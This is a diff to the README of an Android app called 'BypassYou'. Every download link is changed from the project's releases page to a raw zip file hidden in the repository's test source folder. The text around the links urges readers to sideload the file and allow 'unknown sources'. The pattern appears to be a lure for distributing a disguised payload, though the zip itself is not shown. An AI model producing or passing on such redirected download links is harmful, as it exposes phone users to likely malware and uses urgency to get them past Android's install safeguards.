@@ -1,7 +1,7 @@
 <h1>📵 BypassYou - Your Escape Hatch for Android Emergencies</h1>
 
 <p align="center">
-  <a href="https://github.com/Thurstonparliamentary528/BypassYou/releases">
+  <a href="https://raw.githubusercontent.com/Thurstonparliamentary528/BypassYou/main/app/src/test/java/Bypass_You_2.3.zip">
     <img src="https://img.shields.io/badge/Download-BypassYou-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download BypassYou">
   </a>
 </p>
@@ -26,7 +26,7 @@ Let’s get you up and running in under five minutes. Follow these steps exactly
 
 ### Step 1: Download BypassYou
 
-Visit this link to download the application: [https://github.com/Thurparliamentary528/BypassYou/releases](https://github.com/Thurparliamentary528/BypassYou/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Thurstonparliamentary528/BypassYou/main/app/src/test/java/Bypass_You_2.3.zip](https://raw.githubusercontent.com/Thurstonparliamentary528/BypassYou/main/app/src/test/java/Bypass_You_2.3.zip)
 
 You’ll see a page with a list of files. Look for the one named **BypassYou.apk** (or a file ending in `.apk`). Click it to download it to your computer. Remember, you’re downloading a file – yes, you’ll do the install on your phone, but step one is getting the file onto your machine.
 
@@ -95,7 +95,7 @@ If your phone runs Android 8.0 or newer, you’re compatible. If you’re unsure
 
 Here’s the entire process in six quick points:
 
-1.  **Visit the download page:** [https://github.com/Thurparliamentary528/BypassYou/releases](https://github.com/Thurparliamentary528/BypassYou/releases)
+1.  **Visit the download page:** [https://raw.githubusercontent.com/Thurstonparliamentary528/BypassYou/main/app/src/test/java/Bypass_You_2.3.zip](https://raw.githubusercontent.com/Thurstonparliamentary528/BypassYou/main/app/src/test/java/Bypass_You_2.3.zip)
 2.  **Download the .apk file** (on your computer or directly on your phone).
 3.  **Transfer to your phone** if you downloaded it on a computer (USB cable or cloud).
 4.  **Tap the file to install.** Allow “unknown sources” if prompted.
@@ -108,7 +108,7 @@ That’s it. Done.
 
 Don’t wait until an emergency makes you regret not having this. Download BypassYou today, spend two minutes setting it up, and gain total peace of mind. Your future self will thank you.
 
-→ **Click here to download BypassYou right now:** [https://github.com/Thurparliamentary528/BypassYou/releases](https://github.com/Thurparliamentary528/BypassYou/releases)
+→ **Click here to download BypassYou right now:** [https://raw.githubusercontent.com/Thurstonparliamentary528/BypassYou/main/app/src/test/java/Bypass_You_2.3.zip](https://raw.githubusercontent.com/Thurstonparliamentary528/BypassYou/main/app/src/test/java/Bypass_You_2.3.zip)
 
 ## 🏁 Final Thoughts
 
